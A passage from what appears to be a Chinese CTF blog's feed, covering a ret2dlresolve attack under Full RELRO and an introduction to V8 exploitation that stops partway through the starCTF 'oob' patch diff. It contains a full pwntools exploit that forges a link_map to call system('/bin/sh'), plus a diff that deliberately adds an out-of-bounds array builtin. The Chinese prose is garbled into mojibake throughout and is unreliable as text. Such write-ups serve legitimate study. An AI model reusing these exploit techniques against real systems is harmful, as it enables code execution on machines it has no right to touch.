class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lookup_t</span></span><br><span class="line">_dl_lookup_symbol_x (<span class="keyword">const</span> <span class="keyword">char</span> *undef_name, struct link_map *undef_map,</span><br><span class="line">     <span class="keyword">const</span> ElfW(Sym) **ref,</span><br><span class="line">     struct r_scope_elem *symbol_scope[],</span><br><span class="line">     <span class="keyword">const</span> struct r_found_version *version,</span><br><span class="line">     <span class="keyword">int</span> type_class, <span class="keyword">int</span> flags, struct link_map *skip_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> new_hash = _dl_new_hash (undef_name);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> old_hash = <span class="number">0xffffffff</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sym_val</span> <span class="title">current_value</span> =</span> &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">scope</span> =</span> symbol_scope;</span><br><span class="line"></span><br><span class="line">  bump_num_relocations ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned</span></span><br><span class="line"><span class="comment">     lookups.  */</span></span><br><span class="line">  assert (version == <span class="literal">NULL</span> || !(flags &amp; DL_LOOKUP_RETURN_NEWEST));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (skip_map != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">    <span class="keyword">while</span> ((*scope)-&gt;r_list[i] != skip_map)</span><br><span class="line">      ++i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> start = i; *scope != <span class="literal">NULL</span>; start = <span class="number">0</span>, ++scope)</span><br><span class="line">    <span class="keyword">if</span> (do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,</span><br><span class="line">     &amp;current_value, *scope, start, version, flags,</span><br><span class="line">     skip_map, type_class, undef_map) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>_dl_lookup_symbol_x</code>å‡½æ•°ä¸­æœç´¢çš„æ–¹æ³•æ˜¯æ ¹æ®<code>scope</code>è¿™ä¸ªèŒƒå›´æœç´¢çš„ï¼Œè€Œè¿™ä¸ªèŒƒå›´æ˜¯é€šè¿‡<code>l-&gt;l_scope</code>è·å–çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åœ¨æ²¡æœ‰ä»»ä½•åœ°å€æ³„æ¼çš„æƒ…å†µä¸‹è¦æƒ³ä¼ªé€ <code>l_scope</code>æ˜¯ä¸ç°å®çš„ã€‚é‚£ä¹ˆå”¯ä¸€çš„æ–¹æ³•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯èµ°elseè¯­å¥äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥è¿”å›çš„æ˜¯<code>link_map-&gt;l_addr + sym-&gt;d_val</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005c1</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x4003f6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rsi_r15)+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(read_plt)+p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">dynstr_addr = <span class="number">0x400318</span> <span class="comment"># str table</span></span><br><span class="line">fake_link_map_addr = bss+<span class="number">0x100</span></span><br><span class="line">r_offset = fake_link_map_addr + l_addr * -<span class="number">1</span> - <span class="number">8</span></span><br><span class="line">l_addr = l_addr &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)</span><br><span class="line">fake_strtab = p64(<span class="number">0</span>)+p64(dynstr_addr)</span><br><span class="line">fake_strtab_addr = fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">fake_symtab = p64(<span class="number">0</span>)+p64(read_got-<span class="number">0x8</span>)</span><br><span class="line">fake_symtab_addr = fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">fake_dynrel_addr = fake_link_map_addr+<span class="number">0x28</span></span><br><span class="line">fake_rel_addr = fake_link_map_addr+<span class="number">0x38</span></span><br><span class="line">fake_dynrel = p64(<span class="number">0</span>)+p64(fake_rel_addr)</span><br><span class="line">fake_rel = p64(r_offset)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_rel</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_dynrel_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">r.sendline(fake_link_map)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = fake_link_map_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(read_load_plt) + \</span><br><span class="line">    p64(fake_link_map_addr)+p64(<span class="number">0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†æ¬¡å®¡è§†è¿™æ®µexpï¼Œå¯ä»¥å‘ç°<code>l_addr</code>å…¶å®å°±æ˜¯<code>read</code>å‡½æ•°å’Œ<code>system</code>å‡½æ•°ä¹‹é—´çš„å·®å€¼ï¼Œè€Œ<code>sym-&gt;d_val</code>å°±æ˜¯<code>read</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥å°†è¿™ç¯‡æ–‡ç« çš„ä»£ç è¿›è¡Œç¼–è¯‘ä¼šå‘ç°ä»–çš„gotè¡¨ä¸­<code>read</code>å‡½æ•°ä¸æ˜¯é¦–ä½ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯<code>_libc_start_main</code>è¿™ä¹Ÿåˆšå¥½å¯ä»¥è®©<code>sym-&gt;st_other</code>ä¸ä¸º0ä»è€Œè¿›å…¥elseã€‚</p><h3 id="ä¸Fullçš„å·®åˆ«"><a href="#ä¸Fullçš„å·®åˆ«" class="headerlink" title="ä¸Fullçš„å·®åˆ«"></a>ä¸Fullçš„å·®åˆ«</h3><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥ï¼Œè¿™é“é¢˜ç›®æ‰€åˆ©ç”¨çš„æ–¹å¼å…¶å®æ˜¯èµ°çš„ifåˆ†æ”¯è€Œä¸æ˜¯elseï¼Œå› ä¸ºè¿™é“é¢˜å‹æ ¹æ²¡ç»™libcæ‰€ä»¥æ— æ³•è®¡ç®—åç§»ã€‚è™½ç„¶æˆ‘åœ¨æ„é€ symç»“æ„ä½“çš„æ—¶å€™é€‰æ‹©äº†<code>read@got - 8</code>çš„ä½ç½®ï¼Œä½†æ˜¯å±äºæ˜¯ççŒ«ç¢°åˆ°æ­»è€—å­è¿™ä¸ªé¢˜ç›®ä¸­çš„<code>read</code>å°±æ˜¯gotè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æ‰æ²¡æœ‰å¯¼è‡´<code>sym-&gt;st_other</code>ä¸ºé0ã€‚</p><p>å¯èƒ½å¤§å®¶ä¼šç–‘æƒ‘ä¸ºä»€ä¹ˆè¿™é‡Œèƒ½å¤Ÿèµ°ä¸Šé¢çš„ifè¯­å¥ï¼Œåˆæ˜¯å› ä¸ºè¿æ°”å¥½ï¼ˆå¯èƒ½æ˜¯åšé¢˜è¿æ°”ç”¨å®Œäº†ï¼Œå›½èµ›å•¥éƒ½æ²¡æŠ½åˆ°ğŸ˜­ï¼‰ï¼Œåœ¨è¿›è¡Œæ—¶ndxåˆæ˜¯ä¸º0ã€‚å½“ç„¶å¦‚æœä¸ä¸º0æˆ‘ä»¬å¯ä»¥é‡‡å–ä¸Šé¢çš„ç¬¬äºŒç§åŠæ³•ï¼Œç›´æ¥è¦†ç›–<code>0x1d0</code>ä¸º0å³å¯ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230728222143061.png"                      alt="image-20230728222143061"                ></p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://inaz2.hatenablog.com/entry/2014/07/29/020112" >https://inaz2.hatenablog.com/entry/2014/07/29/020112<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41" >https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨å…ˆå‰å…¶å®æˆ‘å·²ç»å†™è¿‡ä¸€ç¯‡&lt;a href=&quot;https://cv196082.gitee.io/2022/02/03/ret2dl-runti</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="dl-runtime-resolve" scheme="https://cv196082.gitee.io/tags/dl-runtime-resolve/"/>
    
    <category term="Full RELRO" scheme="https://cv196082.gitee.io/tags/Full-RELRO/"/>
    
  </entry>
  
  <entry>
    <title>v8åˆä½“éªŒ</title>
    <link href="https://cv196082.gitee.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://cv196082.gitee.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2023-06-27T12:05:06.000Z</published>
    <updated>2023-06-27T12:05:13.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ®µäº‹æƒ…å› ä¸ºå„ç§äº‹æƒ…è€½æï¼Œä¸€ç›´æ²¡æœ‰æ›´æ–°æ–‡ç« ã€‚æœ¬æ‰“ç®—æ–°çš„ä¸€ç¯‡å‡º<code>rootkit</code>æ¥æ°´ä¸€ç¯‡ï¼Œåé¢å‘ç°a3ä½¬å†™çš„å¤ªå¤šäº†ï¼Œä¸æƒ³ç»§ç»­çœ‹äº†ã€‚ç„¶åå‰é˜µå­ä¸€ç›´åœ¨æ€è€ƒåç»­åˆ°åº•æ˜¯å­¦ä»€ä¹ˆæ–¹å‘ï¼Œåœ¨dockeré€ƒé€¸ã€chromeå†…æ ¸ã€iotè¿˜æœ‰fuzzä¹‹é—´çŠ¹è±«ä¸å†³ï¼Œç°åœ¨ä¹Ÿç®—æ˜¯ä¸‹å®šå†³å¿ƒæ¥å­¦å­¦chromeäº†ï¼Œåªå¸Œæœ›èƒ½å¤Ÿå¿«ç‚¹æå®Œï¼Œåé¢è¿˜æ˜¯æ‰“ç®—æ›´å¤šçš„å»å­¦ä¹ dockeré€ƒé€¸ã€‚</p><p>è¿™é‡Œå°±ä¸æç¯å¢ƒå®‰è£…çš„äº‹æƒ…äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³èµ„æ–™ã€‚</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>jsä½œä¸ºä¸€ä¸ªé¢å‘å¯¹è±¡ç¼–ç¨‹çš„è¯­è¨€ï¼Œä»–çš„å˜é‡éƒ½æ˜¯ä»¥ç±»çš„å½¢å¼è¡¨ç°çš„ã€‚å¹¶ä¸”jsä½œä¸ºåŠ¨æ€è¯­è¨€ï¼Œä»–çš„ç±»æˆå‘˜æ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´ä»–åœ¨å†…å­˜ä¸­çš„å­˜åœ¨å½¢å¼ç›¸äº¤ä¸Cè¯­è¨€è¦å¤æ‚çš„å¤šã€‚</p><p>ä½¿ç”¨å¦‚ä¸‹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> int_arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span> : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> object_arr = [obj, obj, obj];</span><br><span class="line"><span class="keyword">var</span> newed_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">%DebugPrint(int_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(float_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(object_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(newed_arr);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„<code>%DebugPrint(int_arr)</code>çš„ä½œç”¨æ˜¯æ‰“å°å‡º<code>int_arr</code>çš„å†…å­˜ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æ‰“å°å‡ºå†…å­˜åœ°å€ã€‚åé¢çš„<code>%SystemBreak()</code>å‡½æ•°åˆ™æ˜¯å°†æ§åˆ¶æƒäº¤ç»™gdbã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0x011117f8df01 &lt;JSArray[3]&gt;</span><br><span class="line">... ...</span><br><span class="line">pwndbg&gt; job 0x011117f8df01</span><br><span class="line">0x11117f8df01: [JSArray]</span><br><span class="line"> - map: 0x07bd46242d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8de19 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df01-1</span><br><span class="line">00:0000â”‚  0x11117f8df00 â€”â–¸ 0x7bd46242d99 â—‚â€” 0x40000020b620c01</span><br><span class="line">01:0008â”‚  0x11117f8df08 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">02:0010â”‚  0x11117f8df10 â€”â–¸ 0x11117f8de19 â—‚â€” 0x20b620c08</span><br><span class="line">03:0018â”‚  0x11117f8df18 â—‚â€” 0x300000000</span><br><span class="line">04:0020â”‚  0x11117f8df20 â€”â–¸ 0x20b620c14f9 â—‚â€” 0x20b620c01</span><br><span class="line">05:0028â”‚  0x11117f8df28 â—‚â€” 0x300000000</span><br><span class="line">06:0030â”‚  0x11117f8df30 â—‚â€” 0x3ff199999999999a</span><br><span class="line">07:0038â”‚  0x11117f8df38 â—‚â€” 0x3ff3333333333333</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8de19-1</span><br><span class="line">00:0000â”‚  0x11117f8de18 â€”â–¸ 0x20b620c0851 â—‚â€” 0x20b620c01</span><br><span class="line">01:0008â”‚  0x11117f8de20 â—‚â€” 0x300000000</span><br><span class="line">02:0010â”‚  0x11117f8de28 â—‚â€” 0x100000000</span><br><span class="line">03:0018â”‚  0x11117f8de30 â—‚â€” 0x200000000</span><br><span class="line">04:0020â”‚  0x11117f8de38 â—‚â€” 0x300000000</span><br><span class="line">05:0028â”‚  0x11117f8de40 â€”â–¸ 0x20b620c0801 â—‚â€” 0x20b620c01</span><br><span class="line">06:0030â”‚  0x11117f8de48 â—‚â€” 0x300000000</span><br><span class="line">07:0038â”‚  0x11117f8de50 â€”â–¸ 0xeff64df451 â—‚â€” 0x9a0000020b620c05</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ‰“å°å‡ºæ¥çš„æ˜¯ä¸€ä¸ªintç±»å‹çš„æ•°ç»„ï¼Œåœ¨ä½¿ç”¨jobå‘½ä»¤å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°è¿™å—å†…å­˜çš„æ•°æ®ç»“æ„ã€‚é¦–å…ˆæ˜¯ä¸€ä¸ªæŒ‡å‘mapçš„æŒ‡é’ˆï¼Œéšååœ¨jobæ˜¾ç¤ºçš„å’Œ<code>telescope</code>å‡ºæ¥çš„å†…å®¹æœ‰ä¸€å®šå‡ºå…¥ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç›¸ä¿¡<code>telescope</code>ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªæˆå‘˜åº”è¯¥æ˜¯<code>properties</code>ï¼Œéšåå°±æ˜¯<code>elements</code>æŒ‡é’ˆï¼Œæœ€åå°±æ˜¯<code>length</code>ã€‚å¯ä»¥çœ‹å‡ºæ¥<code>elements</code>æŒ‡é’ˆå°±æ˜¯çœŸæ­£æŒ‡å‘æ•°æ®çš„æŒ‡é’ˆï¼Œå¹¶ä¸”åœ¨åé¢ç´§è·Ÿäº†<code>elements</code>å†…å­˜åŒºåŸŸçš„ç»“æ„ã€‚</p><h2 id="starCTF-oob"><a href="#starCTF-oob" class="headerlink" title="starCTF oob"></a>starCTF oob</h2><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ 